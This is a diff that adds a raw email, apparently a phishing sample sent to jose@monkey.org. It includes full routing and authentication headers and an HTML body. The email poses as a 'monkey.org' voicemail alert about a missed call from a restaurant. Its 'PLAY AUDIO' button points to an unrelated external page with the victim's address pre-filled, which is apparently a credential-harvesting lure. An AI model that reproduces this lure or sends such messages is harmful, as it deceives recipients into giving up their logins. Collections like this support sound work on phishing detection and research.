@@ -1,0 +1,159 @@
+Return-Path: rhea@icionvend.com
+Delivered-To: jose@monkey.org
+X-FDA: 82845972048.29.7B317B1
+Received: from frame.icionvend.com (frame.icionvend.com [194.169.172.143])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id B371E120003
+	for <jose@monkey.org>; Sun,  1 Dec 2024 10:11:03 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;	dkim=pass
+ header.d=icionvend.com header.s=dkim header.b=VNFapkcI;	dmarc=pass
+ (policy=none) header.from=icionvend.com;	spf=pass (imf18.b.hostedemail.com:
+ domain of rhea@icionvend.com designates 194.169.172.143 as permitted sender)
+ smtp.mailfrom=rhea@icionvend.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1733047861; a=rsa-sha256;
+	cv=none;
+	b=12hyqlUbRCtVuEUIV+Cy8zVqhLi1Mrp7Tkp+W4GtHN/HbMcEaBK0BKekQsL0/FF92QfOe3
+	7EA5siOr7YuimmQ9lQ9tQq9lonuFXUT/2w/YUabw5nDcs9zslduUZua4hwULjR6+2be9te
+	jwPyH+OPAxB825oPI1Jtg8v4PWTJhHA=
+ARC-Authentication-Results: i=1;	imf18.b.hostedemail.com;	dkim=pass
+ header.d=icionvend.com header.s=dkim header.b=VNFapkcI;	dmarc=pass
+ (policy=none) header.from=icionvend.com;	spf=pass (imf18.b.hostedemail.com:
+ domain of rhea@icionvend.com designates 194.169.172.143 as permitted sender)
+ smtp.mailfrom=rhea@icionvend.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1733047861;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=c3FPmNOD49RMzQmz5k+htdJ8Y+QuGIjFWEZaOczOEBw=;
+	b=v1wYnx4E9JV0pBojhUY/Cpj7KMYAVHx2FQv+9JrwQnmFOHogGDjxpENWDbyAz0Lo6ilPRj
+	uBs5MWIFeIvv0XrGK5KrC7NJ7yR7QG71wOtNdk1GOXDxh2cPlPIPjt1qilzaRdmSiDYqIX
+	LUj3YOA8e37uxtYlhP+tiLYd2EdkzQA=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=icionvend.com; 
+ =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID=3AMIME-Version=3ACont?=
+ =?utf-8?q?ent-Type=3AContent-Transfer-Encoding=3B?= i=rhea@icionvend.com;
+ bh=0NStZd/J1VuiOqXKJZdqQoKYMvg=; =?utf-8?q?b=3DVNFapkcIF0MFPryP+vr3FYxQUIZ7?=
+ =?utf-8?q?eTcgAF5xGpJUkvySzcRA3PbvWP4XDBQyBqXjshlsD/cNCHVE?=  
+ 7j3ScFMf3Hi3oBYZiBZWOaPU/gB1QxK3lavOEfHrozqZJnecx0UqWKgKeXVyivtzADliaVy+0YBD
+  
+ uJJf+FNXTRO0sh4fFI3OSu2LAvHnCkSxE8CMsTE8egdbSZUCFdvQmrCEpNT3L7NSdoMXdEMuRsxh
+  
+ QICfmU6W+lBjLrFvFaD3hQ2ZMFPSpRhbxHDuh4nIjslwgFcC/GVos/AByVR/GKP138DE4S2sh067
+   HZYMcosJGlMW2BhXe5ZaUSNfzakwJMtUs02xUA==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=icionvend.com; 
+ =?utf-8?q?b=3Db15vXNErqWIJD6aN4rifLq5ZAHVTl20Tkzg8q8c2Pcvtz86IK/yQIxn8AQKn9?=
+ =?utf-8?q?/yDATx7LZ/Uyr3B?=  
+ FjoNRquvUPFlqjFKowLuCblULqzGjXvmI1fKtYy803d8ZjlPhkJ+8F0XmTbyaWKKhecxyH3Wdq9d
+  
+ 5trkOpRVhu2ptlnVsP9VXedkEAIcykLehW6hxCop6rVTLbN8UHaxhYWkutrkGVWzX8yKVGbY0zKL
+  
+ StrdzNhSv5EkWydMqadMY9hILbjZW4bowLczq7lU4Eth+5T9I+Nn1G7dXwyRXLIYKm6IA61XGhde
+   8SN5A6atGTvr6g96sCMjFZazLvcnwAq6pELt8g==;
+From: "Voicemail, monkey.org"<rhea@icionvend.com>
+To: jose@monkey.org
+Subject: Re: jose You have a new Voicemail From PURANMAL RESTAURANT LLC 
+Date: 30 Nov 2024 10:43:21 +0000
+Message-ID: <20241130104321.8DC84BF00CDC4C4B@icionvend.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Stat-Signature: cnq4p9cbqdxqnf3btxzm3d4wbd1ucw7e
+X-Rspamd-Server: rspam05
+X-Rspamd-Queue-Id: B371E120003
+X-Rspam-User: 
+X-Spam-Status: No, score=2.52
+X-HE-Tag: 1733047863-211143
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18/uI3sop6K9hb/qjLykQzCK0f6Ckd/Q/ND1DTmQDntcAL?=
+ =?utf-8?q?u7/I5aHAmbZk6+ows0GKy7VhiaGVJTFFXW3U8yf3jcz8yM9RrWEmSfBgWrOhaATEM?=
+ =?utf-8?q?7Neim5Rt1p+SuC4K0hYX09tbU1emV84JCT09GMCKlGPq1Et09g5T3rU/WG0aiCfmz?=
+ =?utf-8?q?7AwDiRF9lj9MllVDTUYCiLtU0qiVhJfvT7ORXCggezKQC56tIRWf/XXJ2WVSqSGp+?=
+ =?utf-8?q?fDY8OXFKnRm7YhToL+2pREQ4i5tFx46Z9ha9bjtksRnVZWaVx+xVZwrn6FXDrPIuy?=
+ =?utf-8?q?aZxeZNuVAzRxsNfx7wpygPCVgOBXujpJJED3ZrPxgihihpqFiXfF2rMPDlpcVKBHD?=
+ =?utf-8?q?mSjgaF+tklzRIaMoMQfYrHcN+jBR2Vv0QmWTlJSBh0lAmMTHWZ1vvi4+1cH+lhb63?=
+ =?utf-8?q?TqUECWA35RuBl4cmHm4QTJEydSrBf3D85ZpMvcDBhcZnKDsY2oW9rZhFcyWDQ0ceF?=
+ =?utf-8?q?sPJhz0jEWrx40k5xY38JlpQ0hfgKwIasK5fml82RCugHvjCqDsNw5pZ7tQGxygq8p?=
+ =?utf-8?q?0Pymn+jP+6IVznNL6cFYOXTvD3m6TOTKSEe51MIJ2ewWu5TnBc8tITZWLq11ludVA?=
+ =?utf-8?q?VOciwtOFzYpZlUuc2DE3CEzS9Ry36gzA8G4iIC9/kMNFCDE7/LtK1o3ZN4InXaWv5?=
+ =?utf-8?q?E92V7nUrbtL7e07uX3KL+xdJ6DtW/aUK5/4ps59neB8mwCs89xjK4EzVuL2B4C7kq?=
+ =?utf-8?q?NGqv+2RCDZTSSbUD7eO2IzEGj224oEC/RVGROQmwfzzxsPNuIdpXz6O+4Ac5tjTg9?=
+ =?utf-8?q?5057eAA5kFvMOrLjXJWqClPl2jYDLWqfB8OTYsArCUEl+mhQPuC4G6bKtKwkLRvtq?=
+ =?utf-8?q?9/IKv/HaMUsiAKpoNDPT5K2cuwUOzGoRcgXa0DypH++SJshnufL1/Ozjz+v5f/fso?=
+ =?utf-8?q?W4lUdwzVt0mZS+uZt0j43I_PtCu1sKGc2EFrBlC9DCo53QIQ/C7YhUD8x6qIfbo6/?=
+ =?utf-8?q?kor9JxmVsGET12aiIlwyJ/roUjilyM3v6SGDdCZiBSiyDdvqpnwEgD9eLqIiTgKFC?=
+ =?utf-8?q?x3u0sJZIZHUxPe0uXeoFAYX3Vs1VB83wlyC4RBxqfvwotm/xvOgJ/uJIvT?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 371
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><br>
+<table width=3D"600" class=3D"x_x_x_content-table" style=3D"padding: 25px 3=
+2px; border-bottom-color: rgb(238, 238, 238); border-bottom-width: 1px; bor=
+der-bottom-style: solid;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td class=3D"x_x_x_email-content" style=3D"line-height: 20px; font-size: 14=
+px; white-space: normal !important;">Hello <b>jose@monkey.org</b>,<br></td>=
+</tr>
+<tr>
+<td style=3D"line-height: 24px; padding-bottom: 20px; font-size: 16px; whit=
+e-space: normal !important;">You missed a call from PURANMAL RESTAURANT LLC=
+ <span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border=
+-image: none; vertical-align: baseline;">&nbsp;</span>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; vertical-align: baseline; white-space: nowrap;">(971) 265-xx19=
+=2E</span></td></tr>
+<tr>
+<td style=3D"color: rgb(117, 117, 117) !important; white-space: normal !imp=
+ortant;">Click PLAY below to listen to your message<br></td></tr>
+<tr>
+<td style=3D"padding: 20px 0px; line-height: 37px; font-size: 14px; white-s=
+pace: normal !important;">
+<a style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-ima=
+ge: none; vertical-align: baseline;" href=3D"https://candourtankers.ae/govf=
+edex.html?email=3Djose@monkey.org" target=3D"_blank" rel=3D"noopener norefe=
+rrer">
+<span style=3D"margin: 0px; padding: 10px 15px; border: 0px currentColor; b=
+order-image: none; color: rgb(255, 255, 255) !important; text-transform: up=
+percase; letter-spacing: 0.05em; text-decoration: none; vertical-align: bas=
+eline; background-color: rgb(0, 121, 107);">PLAY AUDIO</span></a></td></tr>=
+</tbody></table>
+<table width=3D"600" class=3D"x_x_x_content-table" style=3D"padding: 25px 3=
+2px; color: rgb(117, 117, 117) !important; font-family: inherit; font-size:=
+ 9px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"white-space: normal !important;">
+<table width=3D"240" class=3D"x_x_x_footer-link" style=3D"line-height: 14px=
+; font-family: inherit; font-size: 9px;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding-right: 5px; white-space: normal !important;"><span sty=
+le=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: no=
+ne; vertical-align: baseline;">monkey.org Voice Mail App</span></td>
+<td style=3D"padding-right: 5px; white-space: normal !important;"><span sty=
+le=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: no=
+ne; vertical-align: baseline;">HELP CENTER</span></td>
+<td style=3D"white-space: normal !important;"><span style=3D"margin: 0px; p=
+adding: 0px; border: 0px currentColor; border-image: none; vertical-align: =
+baseline;">HELP FORUM</span></td></tr></tbody></table></td></tr>
+<tr>
+<td style=3D"padding: 15px 0px; white-space: normal !important;">
+This email was sent to you because you indicated that you&amp;apos;d like t=
+o receive email notifications for missed calls. If you don&amp;apos;t want =
+to receive such emails in the future, please update your<span style=3D"marg=
+in: 0px; padding: 0px; border: 0px currentColor; border-image: none; vertic=
+al-align: baseline;">&nbsp;</span>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; vertical-align: baseline;">email notification settings</span>.=
+</td></tr>
+<tr>
+<td style=3D"white-space: normal !important;">monkey.org<br></td></tr>
+<tr></tr></tbody></table></body></html>
+
